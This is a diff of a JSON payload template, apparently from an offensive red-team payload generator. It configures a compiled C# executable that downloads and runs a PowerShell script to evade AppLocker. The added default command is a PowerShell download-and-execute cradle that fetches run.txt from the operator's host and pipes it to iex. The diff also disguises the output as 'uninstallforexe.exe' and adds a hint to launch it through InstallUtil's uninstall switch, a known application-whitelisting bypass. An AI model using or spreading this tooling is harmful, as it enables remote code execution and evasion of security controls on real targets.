@@ -1,15 +1,15 @@
 {
     "categories": [
-        "exe",
+        "powershell",
         "applocker"
     ],
-    "description": "Executable that runs shell code. XOR'd shell code with sleep sandbox evasion.",
+    "description": "Downloads and runs a powershell script, evading applocker.",
     "contentFile": "exeapplockerps.txt",
     "customAttributes": [
         {
-            "name": "callbackURL",
-            "description": "Executable will call back and run the PowerShell script at this http address.",
-            "defaultValue": "http://[[[[ownIP]]]]/misc/run.txt"
+            "name": "powershellCommand",
+            "description": "The powershell command that will run. Default calls back and runs that.",
+            "defaultValue": "(new-object system.net.webclient).downloadstring('http://[[[[ownIP]]]]/misc/run.txt') | iex"
         },
         {
             "name": "compile",
@@ -24,7 +24,7 @@
         "compilationType": "csharp",
         "target": "exe",
         "requiredAssemblies" : [
-            "System.Management.Automation.dll","System.Configuration.Install.dll"
+            "System.Configuration.Install.dll","System.Management.Automation.dll"
         ],
         "compilationAttributes": [
             {
@@ -35,8 +35,9 @@
             {
                 "name": "saveAs",
                 "description": "Name of file to be created, can be full path or just a name",
-                "defaultValue": "bypass.exe"
+                "defaultValue": "uninstallforexe.exe"
             }
         ]
-    }
+    }, 
+    "runHint" : "The powershell that's run doesn't make it to output to the console when run on the target. Using defaults, make the run.txt file >> to a file then read it.\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\users\\public\\uninstallforexe.exe"
 }
